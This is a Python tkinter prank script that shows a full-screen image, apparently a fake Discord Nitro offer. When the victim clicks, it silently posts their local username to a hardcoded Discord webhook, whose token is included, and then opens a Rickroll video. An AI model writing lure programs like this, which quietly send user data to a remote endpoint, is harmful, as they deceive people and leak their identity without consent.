import tkinter as tk
from PIL import ImageTk, Image
import webbrowser
import os
import requests
import getpass

def open_youtube():
    # Récupérer le nom de l'utilisateur du PC
    username = getpass.getuser()

    # Envoi du message à Discord via le webhook
    webhook_url = "https://discord.com/api/webhooks/1129853490970251364/qfFqv1LQ8o5CtJrdg2CYKDLgaDn2sc1jUnZruRy6BZKH7fdkH08SewoUnX74AtKIi8gs"  # Remplacez par votre URL de webhook Discord

    payload = {
        "content": f"L'utilisateur {username} s'est fait rickroll !"
    }

    response = requests.post(webhook_url, json=payload)

    if response.status_code == 204:
        print("Message envoyé avec succès à Discord.")
    else:
        print("Erreur lors de l'envoi du message à Discord.")

    # Ouvrir la vidéo YouTube
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

if __name__ == '__main__':
    root = tk.Tk()
    root.attributes("-fullscreen", True)  # Ouvrir en mode plein écran

    # Chemin vers le dossier d'images
    image_dir = "images"

    # Charger l'image de fond
    background_image_path = os.path.join(image_dir, "nitro_boost.jpg")
    background_image = Image.open(background_image_path)
    # Redimensionner l'image pour s'adapter à la fenêtre
    background_image = background_image.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.ANTIALIAS)
    background_photo = ImageTk.PhotoImage(background_image)

    # Créer un widget de toile (canvas) avec l'image de fond
    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight())
    canvas.create_image(0, 0, anchor=tk.NW, image=background_photo)
    canvas.pack()

    # Charger l'image du bouton
    button_image_path = os.path.join(image_dir, "button_image.png")
    button_image = ImageTk.PhotoImage(file=button_image_path)
    button = tk.Button(root, image=button_image, command=open_youtube, borderwidth=0, highlightthickness=0)
    button.place(x=root.winfo_screenwidth() // 2, y=root.winfo_screenheight() // 2, anchor=tk.CENTER)  # Positionner le bouton au centre

    root.mainloop()
